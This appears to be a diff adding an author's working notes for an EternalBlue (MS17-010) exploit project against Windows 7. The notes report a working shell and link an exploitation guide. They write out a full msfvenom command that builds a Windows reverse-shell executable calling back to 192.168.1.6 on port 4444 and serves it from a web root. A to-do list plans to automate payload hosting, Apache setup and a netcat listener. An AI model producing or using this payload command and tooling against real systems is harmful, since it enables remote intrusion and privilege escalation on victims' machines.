@@ -1,0 +1,19 @@
+Exploit works, and connects and shell is finally recieved - however the issue was sc.exe was still "old" so find a way to overwrite it? 
+mabe delete previous versions it b4 running?
+
+was using this guide:
+https://null-byte.wonderhowto.com/how-to/manually-exploit-eternalblue-windows-server-using-ms17-010-python-exploit-0195414/
+
+sc.exe listens on 192.168.1.6 on port 4444 - and needs to go in a /var/www/html (or other apache/webserver location)
+generating sc.exe: msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.6 LPORT=4444 -f exe > /var/www/html/sc.exe    (stageless)
+
+
+note: this NEEDS a valid user/pass to  work making it good for prv esc... metasploit can do it without one but thats metasploit
+
+seems to be win 7 only too rn, untested on 10
+
+
+
+to do: make user and pass a variable, along with the msvenom command for IP var and port VAR
+	have the exploit be uploaded to /www/var/html auto too + install of apache/start apache
+	have a nc listner be set up too automaticlalyl 
